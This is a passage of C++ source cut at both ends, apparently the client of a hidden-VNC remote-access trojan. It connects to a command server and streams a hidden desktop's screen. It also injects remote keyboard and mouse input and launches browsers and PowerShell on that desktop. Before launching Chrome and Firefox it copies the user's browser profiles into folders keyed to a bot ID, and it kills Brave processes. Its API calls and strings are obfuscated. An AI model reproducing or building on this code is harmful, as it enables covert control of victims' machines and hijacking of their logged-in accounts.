    topDownInfo.bmiHeader.biSize = sizeof(topDownInfo.bmiHeader);
    topDownInfo.bmiHeader.biPlanes = 1;
    topDownInfo.bmiHeader.biBitCount = 24;
    topDownInfo.bmiHeader.biCompression = BI_RGB;
    topDownInfo.bmiHeader.biWidth = frame.width;
    topDownInfo.bmiHeader.biHeight = -frame.height;
    topDownInfo.bmiHeader.biSizeImage = static_cast<DWORD>(frame.pixels.size());

    Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
    hOldBmpScreen = NULL;
    if (Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, frame.height,
        frame.pixels.data(), &topDownInfo, DIB_RGB_COLORS) == frame.height)
    {
        captureSuccess = TRUE;
    }

cleanup:
    if (hOldBmpScreen && hDcScreen)
        Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
    if (hBmpScreen)
        Funcs::pDeleteObject(hBmpScreen);
    if (hDcScreen)
        Funcs::pDeleteDC(hDcScreen);
    if (hDc)
        Funcs::pReleaseDC(NULL, hDc);
    if (!captureSuccess)
        frame = screen2::RawFrame();
    return captureSuccess;
}

static SOCKET ConnectServer()
{
    WSADATA     wsa;
    SOCKET      s;
    SOCKADDR_IN addr;

    printf("[diag] Connecting to server %s:%d\n", g_host, g_port);

    if (Funcs::pWSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] WSAStartup failed\n");
        return NULL;
    }
    if ((s = Funcs::pSocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] socket() failed\n");
        return NULL;
    }

    hostent *he = Funcs::pGethostbyname(g_host);
    if (!he || !he->h_addr_list || !he->h_addr_list[0])
    {
        printf("[!] Failed to resolve host: %s\n", g_host);
        Funcs::pClosesocket(s);
        return NULL;
    }

    Funcs::pMemset(&addr, 0, sizeof(addr));
    Funcs::pMemcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    addr.sin_family = AF_INET;
    addr.sin_port = Funcs::pHtons(g_port);

    if (Funcs::pConnect(s, (sockaddr *)&addr, sizeof(addr)) < 0)
    {
        printf("[!] connect() failed for %s:%d\n", g_host, g_port);
        Funcs::pClosesocket(s);
        return NULL;
    }

    int one = 1;
    Funcs::pSetsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char *)&one, sizeof(one));
    DWORD timeout = gc_socketTimeoutMs;
    // Keep receive operations blocking. The input channel may be idle until the
    // user clicks or types, but sends should not block forever on a stalled peer.
    Funcs::pSetsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout, sizeof(timeout));

    printf("[+] Connected to server %s:%d\n", g_host, g_port);
    return s;
}

static BOOL SendAll(SOCKET s, const void *buffer, int size)
{
    const char *data = (const char *)buffer;
    int sent = 0;
    while (sent != size)
    {
        int ret = Funcs::pSend(s, data + sent, size - sent, 0);
        if (ret <= 0)
            return FALSE;
        sent += ret;
    }
    return TRUE;
}

static BOOL RecvAll(SOCKET s, void *buffer, int size)
{
    char *data = (char *)buffer;
    int received = 0;
    while (received != size)
    {
        int ret = Funcs::pRecv(s, data + received, size - received, 0);
        if (ret <= 0)
            return FALSE;
        received += ret;
    }
    return TRUE;
}

static BOOL SendInt(SOCKET s, int i)
{
    return SendAll(s, &i, (int)sizeof(i));
}

static BOOL RecvInt(SOCKET s, int *i)
{
    return RecvAll(s, i, (int)sizeof(*i));
}

static BOOL SendScreenPacket(SOCKET s, const std::vector<BYTE>& packet)
{
    if (packet.empty() || packet.size() > (size_t)screen2::MAX_WIRE_PACKET_SIZE)
        return FALSE;
    int packetSize = (int)packet.size();
    return SendInt(s, packetSize) && SendAll(s, packet.data(), packetSize);
}

enum ScreenAckStatus
{
    screenAckOk,
    screenAckNeedKeyframe,
    screenAckTimeout,
    screenAckClosed
};

static ScreenAckStatus RecvScreenFrameAck(SOCKET s, int *response)
{
    char *data = (char *)response;
    int received = 0;
    int size = (int)sizeof(*response);
    while (received != size)
    {
        int ret = Funcs::pRecv(s, data + received, size - received, 0);
        if (ret <= 0)
        {
            int err = WSAGetLastError();
            if (err == WSAETIMEDOUT)
                return screenAckTimeout;
            return screenAckClosed;
        }
        received += ret;
    }
    return *response == 0 ? screenAckOk : screenAckNeedKeyframe;
}

struct Screen2SendStats
{
    unsigned long long firstFrames;
    unsigned long long nextFrames;
    unsigned long long totalBytes;
    unsigned long long originalBytes;
    unsigned long long compressedBytes;
    unsigned long long sendMs;
    unsigned long long ackMs;
    unsigned long long ackCount;
    unsigned long long ackTimeouts;
    unsigned long long sendFailures;
    unsigned long long budgetWarnings;
    unsigned long long saturatedDiffs;
    unsigned long long keyframeRequests;
    unsigned long long fpsThrottles;
    unsigned long long qualityDrops;
    unsigned int maxPacketBytes;
    unsigned int maxSendMs;
    unsigned int maxAckMs;
    int maxRectCount;
};

static void ResetScreen2Stats(Screen2SendStats *stats)
{
    Funcs::pMemset(stats, 0, sizeof(*stats));
}

static void RecordScreen2SendStats(Screen2SendStats *stats, const screen2::EncodedFrameInfo& info, BOOL sent, DWORD sendMs)
{
    if (info.isKeyframe)
        ++stats->firstFrames;
    else
        ++stats->nextFrames;
    stats->totalBytes += (unsigned long long)info.totalBytes;
    stats->originalBytes += info.originalSize;
    stats->compressedBytes += info.compressedSize;
    stats->sendMs += sendMs;
    if (sendMs > stats->maxSendMs)
        stats->maxSendMs = sendMs;
    if (info.totalBytes > stats->maxPacketBytes)
        stats->maxPacketBytes = (unsigned int)((info.totalBytes > MAXDWORD) ? MAXDWORD : info.totalBytes);
    if (info.rectCount > stats->maxRectCount)
        stats->maxRectCount = info.rectCount;
    if (!sent)
        ++stats->sendFailures;
    if (info.totalBytes >= screen2::MAX_FRAME_PACKET_SIZE)
        ++stats->budgetWarnings;
    if (info.saturated)
        ++stats->saturatedDiffs;
}

static void RecordScreen2AckStats(Screen2SendStats *stats, DWORD ackMs)
{
    ++stats->ackCount;
    stats->ackMs += ackMs;
    if (ackMs > stats->maxAckMs)
        stats->maxAckMs = ackMs;
}

static DWORD GetEffectiveScreen2FrameMs(DWORD baseFrameMs, DWORD adaptiveFrameMs, ULONGLONG adaptiveUntil)
{
    ULONGLONG now = GetTickCount64();
    if (adaptiveUntil && now < adaptiveUntil && adaptiveFrameMs > baseFrameMs)
        return adaptiveFrameMs;
    return baseFrameMs;
}

static void MaybeReportAndApplyScreen2Stats(Screen2SendStats *stats,
    ULONGLONG *lastReportTick,
    screen2::ScreenFrameEncoder *encoder,
    DWORD *adaptiveFrameMs,
    ULONGLONG *adaptiveUntil,
    BOOL *ackAdaptiveThrottleActive,
    BOOL *ackAdaptiveQualityActive,
    int *normalAckWindows)
{
    const ULONGLONG now = GetTickCount64();
    const ULONGLONG intervalMs = now > *lastReportTick ? now - *lastReportTick : 1;
    if (intervalMs < 3000 && stats->ackTimeouts == 0 && stats->saturatedDiffs == 0 && stats->sendFailures == 0)
        return;

    const unsigned long long frames = stats->firstFrames + stats->nextFrames;
    const unsigned long long avgSendMs = frames ? stats->sendMs / frames : 0;
    const unsigned long long avgAckMs = stats->ackCount ? stats->ackMs / stats->ackCount : 0;
    const unsigned long long bps = intervalMs ? (stats->totalBytes * 1000ULL) / intervalMs : 0;

    BOOL ackSlow = FALSE;
    BOOL ackAdaptive = FALSE;
    BOOL ackQualityDrop = FALSE;
    BOOL adaptiveRestore = FALSE;
    int oldQuality = encoder->GetQuality();
    int newQuality = oldQuality;

    const BOOL hasAckSignal = stats->ackCount > 0 || stats->ackTimeouts > 0;
    const BOOL singleVerySlowAck = stats->ackCount == 1 && stats->maxAckMs > 3000;
    const BOOL slowByAck = stats->ackTimeouts > 0 || singleVerySlowAck ||
        (stats->ackCount >= 2 && (avgAckMs > 1000 || stats->maxAckMs > 2000));
    const BOOL verySlowByAck = stats->ackTimeouts > 0 || singleVerySlowAck ||
        (stats->ackCount >= 2 && (avgAckMs > 1500 || stats->maxAckMs > 3000));
    const BOOL largePacketSlow = stats->ackCount > 0 && slowByAck && stats->maxPacketBytes > 400 * 1024;
    const BOOL normalAck = stats->ackCount > 0 && stats->ackTimeouts == 0 && avgAckMs <= 700 && stats->maxAckMs <= 1200;

    ackSlow = slowByAck;
    if (slowByAck)
    {
        DWORD targetFrameMs = verySlowByAck ? 2000 : 1500;
        if (*adaptiveFrameMs < targetFrameMs)
            *adaptiveFrameMs = targetFrameMs;
        *adaptiveUntil = now + 9000;
        *ackAdaptiveThrottleActive = TRUE;
        *normalAckWindows = 0;
        ackAdaptive = TRUE;
        ++stats->fpsThrottles;
    }
    else if (normalAck)
    {
        ++(*normalAckWindows);
    }
    else if (hasAckSignal)
    {
        *normalAckWindows = 0;
    }

    if (largePacketSlow && encoder->GetQuality() > 70)
    {
        newQuality = 70;
        encoder->SetQuality(newQuality);
        *ackAdaptiveQualityActive = TRUE;
        ackQualityDrop = TRUE;
        ++stats->qualityDrops;
    }

    if (*normalAckWindows >= 3)
    {
        BOOL restored = FALSE;
        if (*ackAdaptiveThrottleActive)
        {
            *adaptiveFrameMs = 0;
            *adaptiveUntil = 0;
            *ackAdaptiveThrottleActive = FALSE;
            restored = TRUE;
        }
        if (*ackAdaptiveQualityActive && encoder->GetQuality() != screen2::DEFAULT_JPEG_QUALITY)
        {
            encoder->SetQuality(screen2::DEFAULT_JPEG_QUALITY);
            *ackAdaptiveQualityActive = FALSE;
            restored = TRUE;
        }
        if (restored)
        {
            adaptiveRestore = TRUE;
            *normalAckWindows = 0;
        }
    }

    printf("[SCREEN2_STATS][client] first=%llu next=%llu bytes=%llu bps=%llu raw=%llu comp=%llu avgSendMs=%llu maxSendMs=%u ackCount=%llu avgAckMs=%llu maxAckMs=%u ackTimeouts=%llu sendFail=%llu budgetWarn=%llu satDiff=%llu kfReq=%llu fpsThrottle=%llu qualityDrop=%llu ackSlow=%u ackAdaptive=%u ackQDrop=%u adaptiveRestore=%u adaptiveMs=%lu quality=%d oldQuality=%d normalAckWin=%d maxPacket=%u maxRects=%d packetBudget=%lu\n",
        stats->firstFrames,
        stats->nextFrames,
        stats->totalBytes,
        bps,
        stats->originalBytes,
        stats->compressedBytes,
        avgSendMs,
        stats->maxSendMs,
        stats->ackCount,
        avgAckMs,
        stats->maxAckMs,
        stats->ackTimeouts,
        stats->sendFailures,
        stats->budgetWarnings,
        stats->saturatedDiffs,
        stats->keyframeRequests,
        stats->fpsThrottles,
        stats->qualityDrops,
        ackSlow ? 1U : 0U,
        ackAdaptive ? 1U : 0U,
        ackQualityDrop ? 1U : 0U,
        adaptiveRestore ? 1U : 0U,
        *adaptiveFrameMs,
        encoder->GetQuality(),
        oldQuality,
        *normalAckWindows,
        stats->maxPacketBytes,
        stats->maxRectCount,
        (DWORD)screen2::MAX_FRAME_PACKET_SIZE);

    ResetScreen2Stats(stats);
    *lastReportTick = now;
}

static DWORD WINAPI DesktopThread(LPVOID param)
{
    DWORD sessionId = (DWORD)(ULONG_PTR)param;
    SOCKET s = ConnectServer();
    screen2::ScreenFrameEncoder encoder(screen2::DEFAULT_JPEG_QUALITY);
    screen2::RawFrame rawFrame;
    screen2::RawFrame lastSizeFrame;
    BOOL sizeSent = FALSE;
    BOOL firstFrameLogged = FALSE;
    BOOL captureFailureLogged = FALSE;
    Screen2SendStats sendStats;
    ResetScreen2Stats(&sendStats);
    ULONGLONG lastStatsReportTick = GetTickCount64();
    ULONGLONG adaptiveUntil = 0;
    ULONGLONG lastSaturatedKeyframeAt = 0;
    DWORD adaptiveFrameMs = 0;
    DWORD baseFrameMs = 1000 / screen2::DEFAULT_FPS;
    int saturatedDiffStreak = 0;
    int normalAckWindows = 0;
    BOOL ackAdaptiveThrottleActive = FALSE;
    BOOL ackAdaptiveQualityActive = FALSE;

    if (!s)
    {
        printf("[!] Desktop channel could not connect (session %lu)\n", sessionId);
        goto exit;
    }

    if (!Funcs::pSetThreadDesktop(g_hDesk))
    {
        printf("[!] Desktop channel SetThreadDesktop failed (session %lu)\n", sessionId);
        goto exit;
    }

    if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
        goto exit;
    if (!SendInt(s, Connection::desktop))
        goto exit;
    if (!SendInt(s, (int)sessionId))
        goto exit;

    printf("[+] Desktop channel handshake sent (session %lu)\n", sessionId);
    {
        DWORD ackTimeoutMs = 5000;
        Funcs::pSetsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&ackTimeoutMs, sizeof(ackTimeoutMs));
    }

    for (;;)
    {
        ULONGLONG frameStartTick = GetTickCount64();
        if (!CaptureDesktopFrame(rawFrame))
        {
            if (!captureFailureLogged)
            {
                printf("[!] Desktop capture failed; no frame will be sent until capture succeeds\n");
                captureFailureLogged = TRUE;
            }
            Funcs::pSleep(100);
            continue;
        }

        if (!sizeSent ||
            rawFrame.virtualX != lastSizeFrame.virtualX ||
            rawFrame.virtualY != lastSizeFrame.virtualY ||
            rawFrame.screenWidth != lastSizeFrame.screenWidth ||
            rawFrame.screenHeight != lastSizeFrame.screenHeight)
        {
            std::vector<BYTE> sizePacket;
            if (!screen2::BuildScreenSizePacket(rawFrame, sizePacket) || !SendScreenPacket(s, sizePacket))
            {
                goto exit;
            }
            lastSizeFrame = rawFrame;
            sizeSent = TRUE;
        }

        std::vector<BYTE> framePacket;
        screen2::EncodedFrameInfo frameInfo;
        if (!encoder.BuildFrame(rawFrame, framePacket, &frameInfo))
        {
            DWORD frameMs = GetEffectiveScreen2FrameMs(baseFrameMs, adaptiveFrameMs, adaptiveUntil);
            Funcs::pSleep(frameMs);
            continue;
        }

        if (frameInfo.saturated)
        {
            ++saturatedDiffStreak;
            ++sendStats.saturatedDiffs;
            ULONGLONG now = GetTickCount64();
            if (saturatedDiffStreak >= 2)
            {
                adaptiveFrameMs = 1000;
                adaptiveUntil = now + 8000;
                ++sendStats.fpsThrottles;
                printf("[SCREEN2][WARN] saturated diff throttling capture interval to %lu ms\n", adaptiveFrameMs);
            }
            if (lastSaturatedKeyframeAt && now < lastSaturatedKeyframeAt + 2000)
            {
                DWORD waitMs = (DWORD)((lastSaturatedKeyframeAt + 2000) - now);
                ++sendStats.keyframeRequests;
                printf("[SCREEN2][WARN] saturated diff keyframe cooldown waited %lu ms\n", waitMs);
                Funcs::pSleep(waitMs);
            }
            lastSaturatedKeyframeAt = GetTickCount64();
        }
        else if (!frameInfo.isKeyframe)
        {
            saturatedDiffStreak = 0;
        }

        ULONGLONG sendStartTick = GetTickCount64();
        if (!SendScreenPacket(s, framePacket))
        {
            RecordScreen2SendStats(&sendStats, frameInfo, FALSE, 0);
            goto exit;
        }
        DWORD sendMs = (DWORD)(GetTickCount64() - sendStartTick);
        RecordScreen2SendStats(&sendStats, frameInfo, TRUE, sendMs);

        int response = 0;
        ULONGLONG ackStartTick = GetTickCount64();
        ScreenAckStatus ackStatus = RecvScreenFrameAck(s, &response);
        if (ackStatus == screenAckClosed)
            goto exit;
        if (ackStatus == screenAckTimeout)
        {
            ++sendStats.ackTimeouts;
            ++sendStats.keyframeRequests;
            encoder.ForceKeyframe();
            adaptiveFrameMs = 2000;
            adaptiveUntil = GetTickCount64() + 9000;
            ackAdaptiveThrottleActive = TRUE;
            normalAckWindows = 0;
            printf("[SCREEN2][WARN] frame ACK timeout, forcing keyframe and throttling capture interval to %lu ms\n", adaptiveFrameMs);
        }
        else if (ackStatus == screenAckNeedKeyframe)
        {
            ++sendStats.keyframeRequests;
            encoder.ForceKeyframe();
            printf("[SCREEN2][WARN] server requested keyframe, forcing full frame\n");
        }
        else
        {
            DWORD ackMs = (DWORD)(GetTickCount64() - ackStartTick);
            RecordScreen2AckStats(&sendStats, ackMs);
            encoder.CommitLastBuiltFrame();
        }

        MaybeReportAndApplyScreen2Stats(&sendStats,
            &lastStatsReportTick,
            &encoder,
            &adaptiveFrameMs,
            &adaptiveUntil,
            &ackAdaptiveThrottleActive,
            &ackAdaptiveQualityActive,
            &normalAckWindows);

        if (!firstFrameLogged)
        {
            printf("[+] First SCREEN2 desktop frame sent: remote=%dx%d, frame=%dx%d, packet=%zu bytes quality=%d\n",
                rawFrame.screenWidth,
                rawFrame.screenHeight,
                rawFrame.width,
                rawFrame.height,
                framePacket.size(),
                encoder.GetQuality());
            firstFrameLogged = TRUE;
        }

        DWORD frameMs = GetEffectiveScreen2FrameMs(baseFrameMs, adaptiveFrameMs, adaptiveUntil);
        DWORD elapsedMs = (DWORD)(GetTickCount64() - frameStartTick);
        if (frameMs > elapsedMs)
            Funcs::pSleep(frameMs - elapsedMs);
    }

exit:
    printf("[!] Desktop thread exiting (session %lu)\n", sessionId);
    if (s)
        Funcs::pClosesocket(s);
    if (g_hInputThread)
        Funcs::pTerminateThread(g_hInputThread, 0);
    return 0;
}

static void killproc(const char* name)
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, name) == 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
                (DWORD)pEntry.th32ProcessID);
            if (hProcess != NULL)
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}

static void StartChrome()
{
    char chromePath[MAX_PATH] = { 0 };
    Funcs::pSHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromePath);
    Funcs::pLstrcatA(chromePath, Strs::hd7);

    char dataPath[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(dataPath, chromePath);
    Funcs::pLstrcatA(dataPath, Strs::hd10);

    char botId[BOT_ID_LEN] = { 0 };
    char newDataPath[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(newDataPath, chromePath);
    GetBotId(botId);
    Funcs::pLstrcatA(newDataPath, botId);

    CopyDir(dataPath, newDataPath);

    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::chromeExe);
    Funcs::pLstrcatA(path, Strs::hd9);
    Funcs::pLstrcatA(path, "\"");
    Funcs::pLstrcatA(path, newDataPath);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartEdge()
{
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::edgeExe);
    Funcs::pLstrcatA(path, Strs::hd9);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartBrave()
{
    killproc("brave.exe");
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::braveExe);
    Funcs::pLstrcatA(path, Strs::hd9);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartFirefox()
{
    char firefoxPath[MAX_PATH] = { 0 };
    Funcs::pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, firefoxPath);
    Funcs::pLstrcatA(firefoxPath, Strs::hd11);

    char profilesIniPath[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(profilesIniPath, firefoxPath);
    Funcs::pLstrcatA(profilesIniPath, Strs::hd5);

    HANDLE hProfilesIni = CreateFileA
    (
        profilesIniPath,
        FILE_READ_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hProfilesIni == INVALID_HANDLE_VALUE)
        return;

    DWORD profilesIniSize = GetFileSize(hProfilesIni, 0);
    DWORD read;
    char *profilesIniContent = (char *)Alloc(profilesIniSize + 1);
    BOOL isRelative = FALSE;
    char *isRelativeRead = NULL;
    char *path = NULL;
    char *pathEnd = NULL;
    char realPath[MAX_PATH] = { 0 };
    char botId[BOT_ID_LEN];
    char newPath[MAX_PATH];
    char browserPath[MAX_PATH] = { 0 };
    STARTUPINFOA startupInfo = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };
    ReadFile(hProfilesIni, profilesIniContent, profilesIniSize, &read, NULL);
    profilesIniContent[profilesIniSize] = 0;

    isRelativeRead = Funcs::pStrStrA(profilesIniContent, Strs::hd12);
    if (!isRelativeRead)
        goto exit;
    isRelativeRead += 11;
    isRelative = (*isRelativeRead == '1');

    path = Funcs::pStrStrA(profilesIniContent, Strs::hd13);
    if (!path)
        goto exit;
    pathEnd = Funcs::pStrStrA(path, "\r");
    if (!pathEnd)
        goto exit;
    *pathEnd = 0;
    path += 5;

    if (isRelative)
        Funcs::pLstrcpyA(realPath, firefoxPath);
    Funcs::pLstrcatA(realPath, path);

    GetBotId(botId);

    Funcs::pLstrcpyA(newPath, firefoxPath);
    Funcs::pLstrcatA(newPath, botId);

    CopyDir(realPath, newPath);

    Funcs::pLstrcpyA(browserPath, Strs::hd8);
    Funcs::pLstrcatA(browserPath, Strs::firefoxExe);
    Funcs::pLstrcatA(browserPath, Strs::hd14);
    Funcs::pLstrcatA(browserPath, "\"");
    Funcs::pLstrcatA(browserPath, newPath);
    Funcs::pLstrcatA(browserPath, "\"");

    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    Funcs::pCreateProcessA(NULL, browserPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

exit:
    Funcs::pCloseHandle(hProfilesIni);
    Funcs::pFree(profilesIniContent);

}

static void StartPowershell()
{
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::powershell);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartIe()
{
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::iexploreExe);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static DWORD WINAPI InputThread(LPVOID param)
{
    SOCKET s = ConnectServer();

    if (!s)
    {
        printf("[!] Input channel could not connect\n");
        return 0;
    }

    if (Funcs::pSetThreadDesktop(g_hDesk))
        printf("[diag] Input thread attached to desktop: %s\n", g_desktopName);
    else
        printf("[!] Input thread SetThreadDesktop failed\n");
    LogDesktopState("input-thread-start");

    if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
    {
        printf("[!] Failed to send input channel magic\n");
        goto exit;
    }
    if (!SendInt(s, Connection::input))
    {
        printf("[!] Failed to send input channel id\n");
        goto exit;
    }

    printf("[+] Input channel handshake sent\n");

    int sessionId;
    if (!RecvInt(s, &sessionId) || !sessionId)
    {
        printf("[!] Failed to receive session id from server\n");
        goto exit;
    }

    printf("[+] Input channel ready; session id=%d\n", sessionId);
    if (!g_dumpedInputDesktopState)
    {
        g_dumpedInputDesktopState = TRUE;
        DumpHiddenDesktopWindows("input-ready");
    }

    g_hDesktopThread = Funcs::pCreateThread(NULL, 0, DesktopThread, (LPVOID)(ULONG_PTR)(DWORD)sessionId, 0, 0);
    if (g_hDesktopThread)
        printf("[diag] Desktop thread created\n");
    else
        printf("[!] Desktop thread creation failed\n");

    POINT      lastPoint;
    HWND       hResMoveWindow = NULL;
    LRESULT    resMoveType = 0;
    BOOL       lmouseDown = FALSE;

    lastPoint.x = 0;
    lastPoint.y = 0;
    BOOL keyDown[256] = { 0 };

    for (;;)
    {
        InputMessage input;
        if (!RecvAll(s, &input, (int)sizeof(input)))
            goto exit;

        UINT   msg = (UINT)input.msg;
        WPARAM wParam = (WPARAM)input.wParam;
        LPARAM lParam = (LPARAM)input.lParam;

        HWND  hWnd{};
        POINT point;
        POINT lastPointCopy;
        BOOL  mouseMsg = FALSE;

        switch (msg)
        {
        case WmStartApp::startExplorer:
        {
            const DWORD neverCombine = 2;
            const char *valueName = Strs::hd4;

            HKEY hKey;
            Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::hd3, 0, KEY_ALL_ACCESS, &hKey);
            DWORD value;
            DWORD size = sizeof(DWORD);
            DWORD type = REG_DWORD;
            Funcs::pRegQueryValueExA(hKey, valueName, 0, &type, (BYTE *)&value, &size);

            if (value != neverCombine)
                Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&neverCombine, size);

            char explorerPath[MAX_PATH] = { 0 };
            Funcs::pGetWindowsDirectoryA(explorerPath, MAX_PATH);
            Funcs::pLstrcatA(explorerPath, Strs::fileDiv);
            Funcs::pLstrcatA(explorerPath, Strs::explorerExe);

            STARTUPINFOA startupInfo = { 0 };
            startupInfo.cb = sizeof(startupInfo);
            startupInfo.lpDesktop = g_desktopName;
            PROCESS_INFORMATION processInfo = { 0 };
            SetLastError(0);
            BOOL createdExplorer = Funcs::pCreateProcessA(explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
            printf("[diag] startExplorer CreateProcess path='%s' desktop='%s' result=%s pid=%lu tid=%lu lastError=%lu\n",
                explorerPath,
                g_desktopName,
                createdExplorer ? "ok" : "failed",
                createdExplorer ? processInfo.dwProcessId : 0,
                createdExplorer ? processInfo.dwThreadId : 0,
                GetLastError());
            if (createdExplorer)
            {
                Funcs::pCloseHandle(processInfo.hThread);
                Funcs::pCloseHandle(processInfo.hProcess);
            }

            APPBARDATA appbarData;
            appbarData.cbSize = sizeof(appbarData);
            for (int i = 0; i < 5; ++i)
            {
                Sleep(1000);
                appbarData.hWnd = Funcs::pFindWindowA(Strs::shell_TrayWnd, NULL);
                if (appbarData.hWnd)
                    break;
            }

            appbarData.lParam = ABS_ALWAYSONTOP;
            Funcs::pSHAppBarMessage(ABM_SETSTATE, &appbarData);

            Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&value, size);
            Funcs::pRegCloseKey(hKey);
            DumpHiddenDesktopWindows("after-startExplorer");
            break;
        }
        case WmStartApp::startRun:
        {
            char rundllPath[MAX_PATH] = { 0 };
            Funcs::pSHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, rundllPath);
            lstrcatA(rundllPath, Strs::hd2);

            STARTUPINFOA startupInfo = { 0 };
            startupInfo.cb = sizeof(startupInfo);
            startupInfo.lpDesktop = g_desktopName;
            PROCESS_INFORMATION processInfo = { 0 };
            Funcs::pCreateProcessA(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
            break;
        }
        case WmStartApp::startPowershell:
        {
            StartPowershell();
            break;
        }
        case WmStartApp::startChrome:
        {
            StartChrome();
            break;
        }
        case WmStartApp::startEdge:
        {
            StartEdge();
            break;
        }
        case WmStartApp::startBrave:
        {
            StartBrave();
            break;
        }
        case WmStartApp::startFirefox:
        {
            StartFirefox();
            break;
        }
        case WmStartApp::startIexplore:
        {
            StartIe();
            break;
        }
        case WM_CHAR:
        case WM_KEYDOWN:
        case WM_KEYUP:
        case WM_SYSCHAR:
        case WM_SYSKEYDOWN:
        case WM_SYSKEYUP:
        {
            point = lastPoint;
            hWnd = GetFocus();
            if (!hWnd)
                hWnd = GetForegroundWindow();
            if (!hWnd)
                hWnd = g_lastInputHwnd;
            if (!hWnd)
                hWnd = FindHiddenDesktopWindowFromPoint(point);
            break;
        }
        default:
        {
            mouseMsg = TRUE;
            point.x = GET_X_LPARAM(lParam);
            point.y = GET_Y_LPARAM(lParam);
            lastPointCopy = lastPoint;
            lastPoint = point;

            hWnd = FindHiddenDesktopWindowFromPoint(point);
            if (!hWnd)
            {
                POINT emptyPoint = { 0, 0 };
                if (ShouldLogInput(msg))
                    LogInputTarget("drop-no-window", msg, NULL, point, emptyPoint, FALSE);
                continue;
            }
            if (ShouldLogInput(msg))
                LogWindowDetails("hidden-hit-test", hWnd);

            if (msg == WM_LBUTTONUP)
            {
                lmouseDown = FALSE;
                hResMoveWindow = NULL;
                resMoveType = 0;
                LRESULT lResult = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);

                HWND topHwnd = hWnd;
                while ((Funcs::pGetWindowLongA(topHwnd, GWL_STYLE) & WS_CHILD))
                {
                    HWND p = Funcs::pGetParent(topHwnd);
                    if (!p) break;
                    topHwnd = p;
                }

                switch (lResult)
                {
                case HTCLOSE:
                {
                    Funcs::pPostMessageA(topHwnd, WM_CLOSE, 0, 0);
                    break;
                }
                case HTMINBUTTON:
                {
                    Funcs::pPostMessageA(topHwnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
                    break;
                }
                case HTMAXBUTTON:
                {
                    WINDOWPLACEMENT windowPlacement;
